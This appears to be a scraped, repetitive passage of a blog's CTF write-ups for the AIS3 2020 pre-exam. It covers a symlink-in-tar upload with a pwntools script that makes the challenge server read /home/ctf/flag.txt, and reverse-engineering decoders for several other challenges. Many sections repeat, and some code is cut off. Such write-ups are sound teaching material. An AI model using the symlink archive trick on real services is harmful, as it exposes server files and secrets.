guess.txt Now we have a tar file. Just write some code. python from pwn import * conn = remote('60.250.197.227', 11000) with open('./guess.tar', 'rb') as f: tar = f.read() num = len(tar) conn.sendline(str(num)) conn.sendline(tar) conn.interactive() BOOOOOOOM, running it looks like it broke. From line 4 we can see guess.txt and flag.txt aren’t in the same directory. But the error also tells us the path. Simply put, it looks like this: text /home/ctf/ |- flag.txt |- tmp7lzztdlk | |- guess.txt So delete the link and redo it! bash $ rm guess.txt guess.tar # remember to delete old files $ ln -s /home/ctf/flag.txt guess.txt $ ls -al lrwxrwxrwx ... guess.txt -\u003e /home/ctf/flag.txt $ tar cvf guess.tar guess.txt Rerun the python code to get the flag~ ","date":"2020-06-30","objectID":"/en/posts/2020/ais3-2020-preexam-writeups/:2:5","series":null,"tags":["AIS3","CTF-Writeup"],"title":"[Writeup] AIS3 2020 Pre-exam","uri":"/en/posts/2020/ais3-2020-preexam-writeups/#shichirou-post-solved-450-points-65-solves"},{"categories":["Cyber Security"],"content":" Shichirou (Post-solved, 450 points, 65 solves) DescriptionSimilarly requires nc to the official Server and find a way to get the flag through the source code. python #!/usr/bin/env python3 import os import sys import tempfile import subprocess import resource resource.setrlimit(resource.RLIMIT_FSIZE, (65536, 65536)) os.chdir(os.environ['HOME']) size = int(sys.stdin.readline().rstrip('\\r\\n')) if size \u003e 65536: print('File is too large.') quit() data = sys.stdin.read(size) with tempfile.NamedTemporaryFile(mode='w+', suffix='.tar', delete=True, dir='.') as tarf: with tempfile.TemporaryDirectory(dir='.') as outdir: tarf.write(data) tarf.flush() try: subprocess.check_output(['/bin/tar', '-xf', tarf.name, '-C', outdir]) except: print('Broken tar file.') raise try: a = subprocess.check_output(['/usr/bin/sha1sum', 'flag.txt']) b = subprocess.check_output(['/usr/bin/sha1sum', os.path.join(outdir, 'guess.txt')]) a = a.split(b' ')[0] b = b.split(b' ')[0] assert len(a) == 40 and len(b) == 40 if a != b: raise Exception('sha1') except: print('Different.') raise print(open('flag.txt', 'r').readline()) SolutionAfter the competition, @stavhaygn mentioned this challenge was old for MacacaHub… from last year’s CSC Finals== Though from my 108 CSC Finals writeup, I didn’t participate in solving it. Darn QwQ Brief explanation of the code above: line 12 is basically inputting a number, the file size. line 17, 18 input a tar packaged file (can use pwntool), then unpack at line 23. line 29 - 35 SHA-1 compare guess.txt and flag.txt on the Server. If they match, output the flag. At first glance I thought it was SHA-1 bypass, but we can’t modify Server files. So what are we supposed to upload? The key is Symbolic link, somewhat like creating a shortcut, linking guess.txt and flag.txt together. First, create the link locally and check with ls. bash $ ln -s flag.txt guess.txt $ ls -al lrwxrwxrwx ... guess.txt -\u003e flag.txt Then tar package it (no compression). bash $ tar cvf guess.tar guess.txt Now we have a tar file. Just write some code. python from pwn import * conn = remote('60.250.197.227', 11000) with open('./guess.tar', 'rb') as f: tar = f.read() num = len(tar) conn.sendline(str(num)) conn.sendline(tar) conn.interactive() BOOOOOOOM, running it looks like it broke. From line 4 we can see guess.txt and flag.txt aren’t in the same directory. But the error also tells us the path. Simply put, it looks like this: text /home/ctf/ |- flag.txt |- tmp7lzztdlk | |- guess.txt So delete the link and redo it! bash $ rm guess.txt guess.tar # remember to delete old files $ ln -s /home/ctf/flag.txt guess.txt $ ls -al lrwxrwxrwx ... guess.txt -\u003e /home/ctf/flag.txt $ tar cvf guess.tar guess.txt Rerun the python code to get the flag~ ","date":"2020-06-30","objectID":"/en/posts/2020/ais3-2020-preexam-writeups/:2:5","series":null,"tags":["AIS3","CTF-Writeup"],"title":"[Writeup] AIS3 2020 Pre-exam","uri":"/en/posts/2020/ais3-2020-preexam-writeups/#description-4"},{"categories":["Cyber Security"],"content":" Shichirou (Post-solved, 450 points, 65 solves) DescriptionSimilarly requires nc to the official Server and find a way to get the flag through the source code. python #!/usr/bin/env python3 import os import sys import tempfile import subprocess import resource resource.setrlimit(resource.RLIMIT_FSIZE, (65536, 65536)) os.chdir(os.environ['HOME']) size = int(sys.stdin.readline().rstrip('\\r\\n')) if size \u003e 65536: print('File is too large.') quit() data = sys.stdin.read(size) with tempfile.NamedTemporaryFile(mode='w+', suffix='.tar', delete=True, dir='.') as tarf: with tempfile.TemporaryDirectory(dir='.') as outdir: tarf.write(data) tarf.flush() try: subprocess.check_output(['/bin/tar', '-xf', tarf.name, '-C', outdir]) except: print('Broken tar file.') raise try: a = subprocess.check_output(['/usr/bin/sha1sum', 'flag.txt']) b = subprocess.check_output(['/usr/bin/sha1sum', os.path.join(outdir, 'guess.txt')]) a = a.split(b' ')[0] b = b.split(b' ')[0] assert len(a) == 40 and len(b) == 40 if a != b: raise Exception('sha1') except: print('Different.') raise print(open('flag.txt', 'r').readline()) SolutionAfter the competition, @stavhaygn mentioned this challenge was old for MacacaHub… from last year’s CSC Finals== Though from my 108 CSC Finals writeup, I didn’t participate in solving it. Darn QwQ Brief explanation of the code above: line 12 is basically inputting a number, the file size. line 17, 18 input a tar packaged file (can use pwntool), then unpack at line 23. line 29 - 35 SHA-1 compare guess.txt and flag.txt on the Server. If they match, output the flag. At first glance I thought it was SHA-1 bypass, but we can’t modify Server files. So what are we supposed to upload? The key is Symbolic link, somewhat like creating a shortcut, linking guess.txt and flag.txt together. First, create the link locally and check with ls. bash $ ln -s flag.txt guess.txt $ ls -al lrwxrwxrwx ... guess.txt -\u003e flag.txt Then tar package it (no compression). bash $ tar cvf guess.tar guess.txt Now we have a tar file. Just write some code. python from pwn import * conn = remote('60.250.197.227', 11000) with open('./guess.tar', 'rb') as f: tar = f.read() num = len(tar) conn.sendline(str(num)) conn.sendline(tar) conn.interactive() BOOOOOOOM, running it looks like it broke. From line 4 we can see guess.txt and flag.txt aren’t in the same directory. But the error also tells us the path. Simply put, it looks like this: text /home/ctf/ |- flag.txt |- tmp7lzztdlk | |- guess.txt So delete the link and redo it! bash $ rm guess.txt guess.tar # remember to delete old files $ ln -s /home/ctf/flag.txt guess.txt $ ls -al lrwxrwxrwx ... guess.txt -\u003e /home/ctf/flag.txt $ tar cvf guess.tar guess.txt Rerun the python code to get the flag~ ","date":"2020-06-30","objectID":"/en/posts/2020/ais3-2020-preexam-writeups/:2:5","series":null,"tags":["AIS3","CTF-Writeup"],"title":"[Writeup] AIS3 2020 Pre-exam","uri":"/en/posts/2020/ais3-2020-preexam-writeups/#solution-5"},{"categories":["Cyber Security"],"content":" Reverse","date":"2020-06-30","objectID":"/en/posts/2020/ais3-2020-preexam-writeups/:3:0","series":null,"tags":["AIS3","CTF-Writeup"],"title":"[Writeup] AIS3 2020 Pre-exam","uri":"/en/posts/2020/ais3-2020-preexam-writeups/#reverse"},{"categories":["Cyber Security"],"content":" TsaiBro (100 points, 281 solves) DescriptionThe challenge gives an ELF file TsaiBro and a cipher(?) TsaiBroSaid. SolutionThe challenge is almost identical to last year’s AIS3 pre-exam. Apparently the problem setter was instructed to have one challenge per category similar to previous years. The difference is the table inside the ELF. If you run the ELF directly, you’ll notice that besides the first line, the “Get rich…” text changes with the input string (as shown below). So our goal is to restore the cipher to FLAG. bash $ chmod +x ./TsaiBro # Give executable permission $ ./TsaiBro ha Terry... reverse... no... knowledge... just... sharing... personal... life... feelings... Get rich......Get rich....Get rich...Get rich $ ./TsaiBro haha Terry... reverse... no... knowledge... just... sharing... personal... life... feelings... Get rich......Get rich....Get rich...Get rich.Get rich......Get rich....Get rich...Get rich. $ ./TsaiBro hahaha Terry... reverse... no... knowledge... just... sharing... personal... life... feelings... Get rich......Get rich....Get rich...Get rich.Get rich......Get rich....Get rich...Get rich.Get rich......Get rich....Get rich...Get rich For TsaiBro, opening IDA Pro (free version) and using F5 decompiler, we can see the main conversion method in the program: cpp table = \"56789{}_WXY0yzABabcdmnopSTUVGHIJKLMNuvwxefghqrstijklOPQRCDEF1234\"; for ( i = 0; i \u003c strlen(argv[1]); ++i ) { for ( j = 0; j \u003c= 63; ++j ) { if ( table[j] == argv[1][i] ){ printf(\u0026byte_968, (unsigned int)(j / 8 + 1), \"..........\", (unsigned int)(j % 8 + 1), \"...........\"); break; } } } For each character in input argv[1], the program looks up the table, then calculates j / 8 + 1 dots and j % 8 + 1 dots respectively. Thus we can reverse it: take the “…” pairs in the cipher, calculate j, then look up the table to get the FLAG! cpp #include \u003cbits/stdc++.h\u003e using namespace std; int main(){ string s; fstream file; file.open(\"TsaiBroSaid\", ios::in); getline(file, s); file \u003e\u003e s; // consume the first \"Terry...\" line s = regex_replace(s, regex(\"Get rich\"), \" \"); // replace with space stringstream ss(s); vector\u003cint\u003e v; // split by space and store dot counts while( getline(ss, s, ' ') ){ if(s.length()) v.push_back(s.length()); } string table = \"56789{}_WXY0yzABabcdmnopSTUVGHIJKLMNuvwxefghqrstijklOPQRCDEF1234\"; for(int i=0; i\u003cv.size(); i+=2){ int idx = v[i+1] + (v[i]-1) * 8 - 1; cout \u003c\u003c table[idx]; } return 0; } ","date":"2020-06-30","objectID":"/en/posts/2020/ais3-2020-preexam-writeups/:3:1","series":null,"tags":["AIS3","CTF-Writeup"],"title":"[Writeup] AIS3 2020 Pre-exam","uri":"/en/posts/2020/ais3-2020-preexam-writeups/#tsaibro-100-points-281-solves"},{"categories":["Cyber Security"],"content":" TsaiBro (100 points, 281 solves) DescriptionThe challenge gives an ELF file TsaiBro and a cipher(?) TsaiBroSaid. SolutionThe challenge is almost identical to last year’s AIS3 pre-exam. Apparently the problem setter was instructed to have one challenge per category similar to previous years. The difference is the table inside the ELF. If you run the ELF directly, you’ll notice that besides the first line, the “Get rich…” text changes with the input string (as shown below). So our goal is to restore the cipher to FLAG. bash $ chmod +x ./TsaiBro # Give executable permission $ ./TsaiBro ha Terry... reverse... no... knowledge... just... sharing... personal... life... feelings... Get rich......Get rich....Get rich...Get rich $ ./TsaiBro haha Terry... reverse... no... knowledge... just... sharing... personal... life... feelings... Get rich......Get rich....Get rich...Get rich.Get rich......Get rich....Get rich...Get rich. $ ./TsaiBro hahaha Terry... reverse... no... knowledge... just... sharing... personal... life... feelings... Get rich......Get rich....Get rich...Get rich.Get rich......Get rich....Get rich...Get rich.Get rich......Get rich....Get rich...Get rich For TsaiBro, opening IDA Pro (free version) and using F5 decompiler, we can see the main conversion method in the program: cpp table = \"56789{}_WXY0yzABabcdmnopSTUVGHIJKLMNuvwxefghqrstijklOPQRCDEF1234\"; for ( i = 0; i \u003c strlen(argv[1]); ++i ) { for ( j = 0; j \u003c= 63; ++j ) { if ( table[j] == argv[1][i] ){ printf(\u0026byte_968, (unsigned int)(j / 8 + 1), \"..........\", (unsigned int)(j % 8 + 1), \"...........\"); break; } } } For each character in input argv[1], the program looks up the table, then calculates j / 8 + 1 dots and j % 8 + 1 dots respectively. Thus we can reverse it: take the “…” pairs in the cipher, calculate j, then look up the table to get the FLAG! cpp #include using namespace std; int main(){ string s; fstream file; file.open(\"TsaiBroSaid\", ios::in); getline(file, s); file \u003e\u003e s; // consume the first \"Terry...\" line s = regex_replace(s, regex(\"Get rich\"), \" \"); // replace with space stringstream ss(s); vector v; // split by space and store dot counts while( getline(ss, s, ' ') ){ if(s.length()) v.push_back(s.length()); } string table = \"56789{}_WXY0yzABabcdmnopSTUVGHIJKLMNuvwxefghqrstijklOPQRCDEF1234\"; for(int i=0; i","date":"2020-06-30","objectID":"/en/posts/2020/ais3-2020-preexam-writeups/:3:1","series":null,"tags":["AIS3","CTF-Writeup"],"title":"[Writeup] AIS3 2020 Pre-exam","uri":"/en/posts/2020/ais3-2020-preexam-writeups/#description-5"},{"categories":["Cyber Security"],"content":" TsaiBro (100 points, 281 solves) DescriptionThe challenge gives an ELF file TsaiBro and a cipher(?) TsaiBroSaid. SolutionThe challenge is almost identical to last year’s AIS3 pre-exam. Apparently the problem setter was instructed to have one challenge per category similar to previous years. The difference is the table inside the ELF. If you run the ELF directly, you’ll notice that besides the first line, the “Get rich…” text changes with the input string (as shown below). So our goal is to restore the cipher to FLAG. bash $ chmod +x ./TsaiBro # Give executable permission $ ./TsaiBro ha Terry... reverse... no... knowledge... just... sharing... personal... life... feelings... Get rich......Get rich....Get rich...Get rich $ ./TsaiBro haha Terry... reverse... no... knowledge... just... sharing... personal... life... feelings... Get rich......Get rich....Get rich...Get rich.Get rich......Get rich....Get rich...Get rich. $ ./TsaiBro hahaha Terry... reverse... no... knowledge... just... sharing... personal... life... feelings... Get rich......Get rich....Get rich...Get rich.Get rich......Get rich....Get rich...Get rich.Get rich......Get rich....Get rich...Get rich For TsaiBro, opening IDA Pro (free version) and using F5 decompiler, we can see the main conversion method in the program: cpp table = \"56789{}_WXY0yzABabcdmnopSTUVGHIJKLMNuvwxefghqrstijklOPQRCDEF1234\"; for ( i = 0; i \u003c strlen(argv[1]); ++i ) { for ( j = 0; j \u003c= 63; ++j ) { if ( table[j] == argv[1][i] ){ printf(\u0026byte_968, (unsigned int)(j / 8 + 1), \"..........\", (unsigned int)(j % 8 + 1), \"...........\"); break; } } } For each character in input argv[1], the program looks up the table, then calculates j / 8 + 1 dots and j % 8 + 1 dots respectively. Thus we can reverse it: take the “…” pairs in the cipher, calculate j, then look up the table to get the FLAG! cpp #include using namespace std; int main(){ string s; fstream file; file.open(\"TsaiBroSaid\", ios::in); getline(file, s); file \u003e\u003e s; // consume the first \"Terry...\" line s = regex_replace(s, regex(\"Get rich\"), \" \"); // replace with space stringstream ss(s); vector v; // split by space and store dot counts while( getline(ss, s, ' ') ){ if(s.length()) v.push_back(s.length()); } string table = \"56789{}_WXY0yzABabcdmnopSTUVGHIJKLMNuvwxefghqrstijklOPQRCDEF1234\"; for(int i=0; i","date":"2020-06-30","objectID":"/en/posts/2020/ais3-2020-preexam-writeups/:3:1","series":null,"tags":["AIS3","CTF-Writeup"],"title":"[Writeup] AIS3 2020 Pre-exam","uri":"/en/posts/2020/ais3-2020-preexam-writeups/#solution-6"},{"categories":["Cyber Security"],"content":" Fallen Beat (144 points, 171 solves) DescriptionThe challenge provides a rhythm game written in JAVA Fallen Beat. You need to achieve FC (Full Combo - hit all notes) to get the flag. I heard it was from a National Central University CS final project, impressive XDDD Gameplay is as follows: SolutionIf gameplay was just D, F, J, K four keys I might try, but adding space is really distracting (face palm). Since this is in Reverse category, it’s not meant to be played directly for the FLAG… If anyone records a handcam I’d love to see it lol Back to the point. Since we need to reverse .jar, find a JAVA Decompiler. I used JD-GUI, threw in the .jar and explored. Though there aren’t many classes, looking around gives clues. Since the flag appears after FC completion, naturally look at PanelEnding.class. Yep, there’s a flag sitting there (laughs) Following the keyword… of course there’s some calculation. Won’t just give the FLAG easily QQ Looking carefully, we still need the important cache variable info. I got stuck here for a while because tracing back would lose track somewhere, probably due to my unfamiliarity with JAVA. Finally found a text file hell.txt that looks like the game chart(?) This hell.txt is a 1475-line pure number file. Here’s the beginning: text 186 ***** DATA 1 0 0 0 28 0 0 14 0 ... ... With the flag calculation found earlier, we have all the clues to reverse the result. cpp #include \u003cbits/stdc++.h\u003e using namespace std; int main(){ string s; fstream file; file.open(\"./songs/gekkou/hell.txt\", ios::in); getline(file, s); getline(file, s); // consume first two lines vector\u003cint\u003e cache; while( getline(file, s) ){ stringstream ss(s); int num; ss \u003e\u003e num; cache.push_back(num); } int flag[] = {89, 74, 75, 43, 126, 69, 120, 109, 68, 109, 109, 97, 73,110, 45, 113, 102, 64, 121, 47, 111, 119, 111, 71, 114, 125, 68, 105, 127, 124, 94, 103, 46, 107, 97, 104 }; int flag_len = sizeof(flag)/sizeof(flag[0]); for(int i=0; i\u003ccache.size(); i++){ flag[ i % flag_len ] ^= cache[i]; } for(int i=0; i\u003cflag_len; i++){ cout \u003c\u003c (char)flag[i]; } return 0; } Solution 2Talking with Lab friends, I learned there’s another solution: directly patch to ignore FC check. Though apparently it messes with formatting(?) and requires manual position adjustments. This image appeared in post-competition Discord. If someone actually FC’d manually and saw this layout, they’d probably cry XDDDDD ","date":"2020-06-30","objectID":"/en/posts/2020/ais3-2020-preexam-writeups/:3:2","series":null,"tags":["AIS3","CTF-Writeup"],"title":"[Writeup] AIS3 2020 Pre-exam","uri":"/en/posts/2020/ais3-2020-preexam-writeups/#fallen-beat-144-points-171-solves"},{"categories":["Cyber Security"],"content":" Fallen Beat (144 points, 171 solves) DescriptionThe challenge provides a rhythm game written in JAVA Fallen Beat. You need to achieve FC (Full Combo - hit all notes) to get the flag. I heard it was from a National Central University CS final project, impressive XDDD Gameplay is as follows: SolutionIf gameplay was just D, F, J, K four keys I might try, but adding space is really distracting (face palm). Since this is in Reverse category, it’s not meant to be played directly for the FLAG… If anyone records a handcam I’d love to see it lol Back to the point. Since we need to reverse .jar, find a JAVA Decompiler. I used JD-GUI, threw in the .jar and explored. Though there aren’t many classes, looking around gives clues. Since the flag appears after FC completion, naturally look at PanelEnding.class. Yep, there’s a flag sitting there (laughs) Following the keyword… of course there’s some calculation. Won’t just give the FLAG easily QQ Looking carefully, we still need the important cache variable info. I got stuck here for a while because tracing back would lose track somewhere, probably due to my unfamiliarity with JAVA. Finally found a text file hell.txt that looks like the game chart(?) This hell.txt is a 1475-line pure number file. Here’s the beginning: text 186 ***** DATA 1 0 0 0 28 0 0 14 0 ... ... With the flag calculation found earlier, we have all the clues to reverse the result. cpp #include using namespace std; int main(){ string s; fstream file; file.open(\"./songs/gekkou/hell.txt\", ios::in); getline(file, s); getline(file, s); // consume first two lines vector cache; while( getline(file, s) ){ stringstream ss(s); int num; ss \u003e\u003e num; cache.push_back(num); } int flag[] = {89, 74, 75, 43, 126, 69, 120, 109, 68, 109, 109, 97, 73,110, 45, 113, 102, 64, 121, 47, 111, 119, 111, 71, 114, 125, 68, 105, 127, 124, 94, 103, 46, 107, 97, 104 }; int flag_len = sizeof(flag)/sizeof(flag[0]); for(int i=0; i","date":"2020-06-30","objectID":"/en/posts/2020/ais3-2020-preexam-writeups/:3:2","series":null,"tags":["AIS3","CTF-Writeup"],"title":"[Writeup] AIS3 2020 Pre-exam","uri":"/en/posts/2020/ais3-2020-preexam-writeups/#description-6"},{"categories":["Cyber Security"],"content":" Fallen Beat (144 points, 171 solves) DescriptionThe challenge provides a rhythm game written in JAVA Fallen Beat. You need to achieve FC (Full Combo - hit all notes) to get the flag. I heard it was from a National Central University CS final project, impressive XDDD Gameplay is as follows: SolutionIf gameplay was just D, F, J, K four keys I might try, but adding space is really distracting (face palm). Since this is in Reverse category, it’s not meant to be played directly for the FLAG… If anyone records a handcam I’d love to see it lol Back to the point. Since we need to reverse .jar, find a JAVA Decompiler. I used JD-GUI, threw in the .jar and explored. Though there aren’t many classes, looking around gives clues. Since the flag appears after FC completion, naturally look at PanelEnding.class. Yep, there’s a flag sitting there (laughs) Following the keyword… of course there’s some calculation. Won’t just give the FLAG easily QQ Looking carefully, we still need the important cache variable info. I got stuck here for a while because tracing back would lose track somewhere, probably due to my unfamiliarity with JAVA. Finally found a text file hell.txt that looks like the game chart(?) This hell.txt is a 1475-line pure number file. Here’s the beginning: text 186 ***** DATA 1 0 0 0 28 0 0 14 0 ... ... With the flag calculation found earlier, we have all the clues to reverse the result. cpp #include using namespace std; int main(){ string s; fstream file; file.open(\"./songs/gekkou/hell.txt\", ios::in); getline(file, s); getline(file, s); // consume first two lines vector cache; while( getline(file, s) ){ stringstream ss(s); int num; ss \u003e\u003e num; cache.push_back(num); } int flag[] = {89, 74, 75, 43, 126, 69, 120, 109, 68, 109, 109, 97, 73,110, 45, 113, 102, 64, 121, 47, 111, 119, 111, 71, 114, 125, 68, 105, 127, 124, 94, 103, 46, 107, 97, 104 }; int flag_len = sizeof(flag)/sizeof(flag[0]); for(int i=0; i","date":"2020-06-30","objectID":"/en/posts/2020/ais3-2020-preexam-writeups/:3:2","series":null,"tags":["AIS3","CTF-Writeup"],"title":"[Writeup] AIS3 2020 Pre-exam","uri":"/en/posts/2020/ais3-2020-preexam-writeups/#solution-7"},{"categories":["Cyber Security"],"content":" Fallen Beat (144 points, 171 solves) DescriptionThe challenge provides a rhythm game written in JAVA Fallen Beat. You need to achieve FC (Full Combo - hit all notes) to get the flag. I heard it was from a National Central University CS final project, impressive XDDD Gameplay is as follows: SolutionIf gameplay was just D, F, J, K four keys I might try, but adding space is really distracting (face palm). Since this is in Reverse category, it’s not meant to be played directly for the FLAG… If anyone records a handcam I’d love to see it lol Back to the point. Since we need to reverse .jar, find a JAVA Decompiler. I used JD-GUI, threw in the .jar and explored. Though there aren’t many classes, looking around gives clues. Since the flag appears after FC completion, naturally look at PanelEnding.class. Yep, there’s a flag sitting there (laughs) Following the keyword… of course there’s some calculation. Won’t just give the FLAG easily QQ Looking carefully, we still need the important cache variable info. I got stuck here for a while because tracing back would lose track somewhere, probably due to my unfamiliarity with JAVA. Finally found a text file hell.txt that looks like the game chart(?) This hell.txt is a 1475-line pure number file. Here’s the beginning: text 186 ***** DATA 1 0 0 0 28 0 0 14 0 ... ... With the flag calculation found earlier, we have all the clues to reverse the result. cpp #include using namespace std; int main(){ string s; fstream file; file.open(\"./songs/gekkou/hell.txt\", ios::in); getline(file, s); getline(file, s); // consume first two lines vector cache; while( getline(file, s) ){ stringstream ss(s); int num; ss \u003e\u003e num; cache.push_back(num); } int flag[] = {89, 74, 75, 43, 126, 69, 120, 109, 68, 109, 109, 97, 73,110, 45, 113, 102, 64, 121, 47, 111, 119, 111, 71, 114, 125, 68, 105, 127, 124, 94, 103, 46, 107, 97, 104 }; int flag_len = sizeof(flag)/sizeof(flag[0]); for(int i=0; i","date":"2020-06-30","objectID":"/en/posts/2020/ais3-2020-preexam-writeups/:3:2","series":null,"tags":["AIS3","CTF-Writeup"],"title":"[Writeup] AIS3 2020 Pre-exam","uri":"/en/posts/2020/ais3-2020-preexam-writeups/#solution-2-1"},{"categories":["Cyber Security"],"content":" Stand up!Brain (455 points, 62 solves) DescriptionThis challenge gives an ELF file joke with the tagline “Now it’s your turn to tell a joke.” SolutionI originally wanted to manually trace following IDA Pro rules, but I accidentally traced out the “joke” lol ","date":"2020-06-30","objectID":"/en/posts/2020/ais3-2020-preexam-writeups/:3:3","series":null,"tags":["AIS3","CTF-Writeup"],"title":"[Writeup] AIS3 2020 Pre-exam","uri":"/en/posts/2020/ais3-2020-preexam-writeups/#stand-upbrain-455-points-62-solves"},{"categories":["Cyber Security"],"content":" Stand up!Brain (455 points, 62 solves) DescriptionThis challenge gives an ELF file joke with the tagline “Now it’s your turn to tell a joke.” SolutionI originally wanted to manually trace following IDA Pro rules, but I accidentally traced out the “joke” lol ","date":"2020-06-30","objectID":"/en/posts/2020/ais3-2020-preexam-writeups/:3:3","series":null,"tags":["AIS3","CTF-Writeup"],"title":"[Writeup] AIS3 2020 Pre-exam","uri":"/en/posts/2020/ais3-2020-preexam-writeups/#description-7"},{"categories":["Cyber Security"],"content":" Stand up!Brain (455 points, 62 solves) DescriptionThis challenge gives an ELF file joke with the tagline “Now it’s your turn to tell a joke.” SolutionI originally wanted to manually trace following IDA Pro rules, but I accidentally traced out the “joke” lol ","date":"2020-06-30","objectID":"/en/posts/2020/ais3-2020-preexam-writeups/:3:3","series":null,"tags":["AIS3","CTF-Writeup"],"title":"[Writeup] AIS3 2020 Pre-exam","uri":"/en/posts/2020/ais3-2020-preexam-writeups/#solution-8"},{"categories":["Cyber Security"],"content":" PwnSome challenges require summoning @stavhaygn ","date":"2020-06-30","objectID":"/en/posts/2020/ais3-2020-preexam-writeups/:4:0","series":null,"tags":["AIS3","CTF-Writeup"],"title":"[Writeup] AIS3 2020 Pre-exam","uri":"/en/posts/2020/ais3-2020-preexam-writeups/#pwn"},{"categories":["Cyber Security"],"content":" BOF (100 points, 189 solves) Description(To be added) Solution(To be added) ","date":"2020-06-30","objectID":"/en/posts/2020/ais3-2020-preexam-writeups/:4:1","series":null,"tags":["AIS3","CTF-Writeup"],"title":"[Writeup] AIS3 2020 Pre-exam","uri":"/en/posts/2020/ais3-2020-preexam-writeups/#bof-100-points-189-solves"},{"categories":["Cyber Security"],"content":" BOF (100 points, 189 solves) Description(To be added) Solution(To be added) ","date":"2020-06-30","objectID":"/en/posts/2020/ais3-2020-preexam-writeups/:4:1","series":null,"tags":["AIS3","CTF-Writeup"],"title":"[Writeup] AIS3 2020 Pre-exam","uri":"/en/posts/2020/ais3-2020-preexam-writeups/#description-8"},{"categories":["Cyber Security"],"content":" BOF (100 points, 189 solves) Description(To be added) Solution(To be added) ","date":"2020-06-30","objectID":"/en/posts/2020/ais3-2020-preexam-writeups/:4:1","series":null,"tags":["AIS3","CTF-Writeup"],"title":"[Writeup] AIS3 2020 Pre-exam","uri":"/en/posts/2020/ais3-2020-preexam-writeups/#solution-9"},{"categories":["Cyber Security"],"content":" Crypto","date":"2020-06-30","objectID":"/en/posts/2020/ais3-2020-preexam-writeups/:5:0","series":null,"tags":["AIS3","CTF-Writeup"],"title":"[Writeup] AIS3 2020 Pre-exam","uri":"/en/posts/2020/ais3-2020-preexam-writeups/#crypto"},{"categories":["Cyber Security"],"content":" Brontosaurus (100 points, 380 solves) DescriptionThe challenge gives a 42k character text file HERE. Here’s just the beginning: text )()]]][+[+][+!+][+![)]]][+!+[)][+][!!(+]][+!+][+!+][+![)][+][!!(+]][+[)][+][!!(+]][+!+][+![)][+][!(+]]][+[+][+!+[)]][[][+]][![(+]][+[)][+][!([][+][!!(+]]][+!+][+![+][+!+[)(]]][+!+[)][+][!!(+]]][+[+][+!+[)]]][+!+[)][+][!!(+]][+!+][+!+][+![)][+][!!(+]][+[)][+][!!(+]][+!+][+![)][+][!(+]]][+[+][+!+[)]][[][+]][![(+]][+[)][+][!([][+][!!(+]][+!+][+![)][+][!(+]]][+[+][+!+[)]]][+!+[)][+][!!(+]][+!+][+!+][+![)][+][!!(+]][+[)][+][!!(+]][+!+][+![)][+][!(+]]][+[+][+!+[)]][[][+]][![(+]][+[)][+][!([][+][!!(+]][+!+][+!+][+![)][+]]][+!+[)][+][!!(+]][+!+][+!+][+![)][+][!!(+]][+[)][+][!!(+]][+!+][+![)][+][!(+]]][+[+][+!+[)]][[][+]][![(+]][+[)][+][!([][(+]][+[)][+] ...... SolutionI later found the challenge is the same as last year’s AIS3 pre-exam. Apparently the problem setter was instructed to have one challenge per category similar to previous years. But at the time I could tell it was JSFuck (been “poisoned” by friends Zzzzz). Just copying to jsfuck decoder fails. When I was puzzled I noticed the first character is ). So I opened python and reversed the string [::-1], then decoded for the flag~ P.S. After sharing with a friend who didn’t participate, they pointed out the filename “KcufSJ” hints at reversal XD ","date":"2020-06-30","objectID":"/en/posts/2020/ais3-2020-preexam-writeups/:5:1","series":null,"tags":["AIS3","CTF-Writeup"],"title":"[Writeup] AIS3 2020 Pre-exam","uri":"/en/posts/2020/ais3-2020-preexam-writeups/#brontosaurus-100-points-380-solves"},{"categories":["Cyber Security"],"content":" Brontosaurus (100 points, 380 solves) DescriptionThe challenge gives a 42k character text file HERE. Here’s just the beginning: text )()]]][+[+][+!+][+![)]]][+!+[)][+][!!(+]][+!+][+!+][+![)][+][!!(+]][+[)][+][!!(+]][+!+][+![)][+][!(+]]][+[+][+!+[)]][[][+]][![(+]][+[)][+][!([][+][!!(+]]][+!+][+![+][+!+[)(]]][+!+[)][+][!!(+]]][+[+][+!+[)]]][+!+[)][+][!!(+]][+!+][+!+][+![)][+][!!(+]][+[)][+][!!(+]][+!+][+![)][+][!(+]]][+[+][+!+[)]][[][+]][![(+]][+[)][+][!([][+][!!(+]][+!+][+![)][+][!(+]]][+[+][+!+[)]]][+!+[)][+][!!(+]][+!+][+!+][+![)][+][!!(+]][+[)][+][!!(+]][+!+][+![)][+][!(+]]][+[+][+!+[)]][[][+]][![(+]][+[)][+][!([][+][!!(+]][+!+][+!+][+![)][+]]][+!+[)][+][!!(+]][+!+][+!+][+![)][+][!!(+]][+[)][+][!!(+]][+!+][+![)][+][!(+]]][+[+][+!+[)]][[][+]][![(+]][+[)][+][!([][(+]][+[)][+] ...... SolutionI later found the challenge is the same as last year’s AIS3 pre-exam. Apparently the problem setter was instructed to have one challenge per category similar to previous years. But at the time I could tell it was JSFuck (been “poisoned” by friends Zzzzz). Just copying to jsfuck decoder fails. When I was puzzled I noticed the first character is ). So I opened python and reversed the string [::-1], then decoded for the flag~ P.S. After sharing with a friend who didn’t participate, they pointed out the filename “KcufSJ” hints at reversal XD ","date":"2020-06-30","objectID":"/en/posts/2020/ais3-2020-preexam-writeups/:5:1","series":null,"tags":["AIS3","CTF-Writeup"],"title":"[Writeup] AIS3 2020 Pre-exam","uri":"/en/posts/2020/ais3-2020-preexam-writeups/#description-9"},{"categories":["Cyber Security"],"content":" Brontosaurus (100 points, 380 solves) DescriptionThe challenge gives a 42k character text file HERE. Here’s just the beginning: text )()]]][+[+][+!+][+![)]]][+!+[)][+][!!(+]][+!+][+!+][+![)][+][!!(+]][+[)][+][!!(+]][+!+][+![)][+][!(+]]][+[+][+!+[)]][[][+]][![(+]][+[)][+][!([][+][!!(+]]][+!+][+![+][+!+[)(]]][+!+[)][+][!!(+]]][+[+][+!+[)]]][+!+[)][+][!!(+]][+!+][+!+][+![)][+][!!(+]][+[)][+][!!(+]][+!+][+![)][+][!(+]]][+[+][+!+[)]][[][+]][![(+]][+[)][+][!([][+][!!(+]][+!+][+![)][+][!(+]]][+[+][+!+[)]]][+!+[)][+][!!(+]][+!+][+!+][+![)][+][!!(+]][+[)][+][!!(+]][+!+][+![)][+][!(+]]][+[+][+!+[)]][[][+]][![(+]][+[)][+][!([][+][!!(+]][+!+][+!+][+![)][+]]][+!+[)][+][!!(+]][+!+][+!+][+![)][+][!!(+]][+[)][+][!!(+]][+!+][+![)][+][!(+]]][+[+][+!+[)]][[][+]][![(+]][+[)][+][!([][(+]][+[)][+] ...... SolutionI later found the challenge is the same as last year’s AIS3 pre-exam. Apparently the problem setter was instructed to have one challenge per category similar to previous years. But at the time I could tell it was JSFuck (been “poisoned” 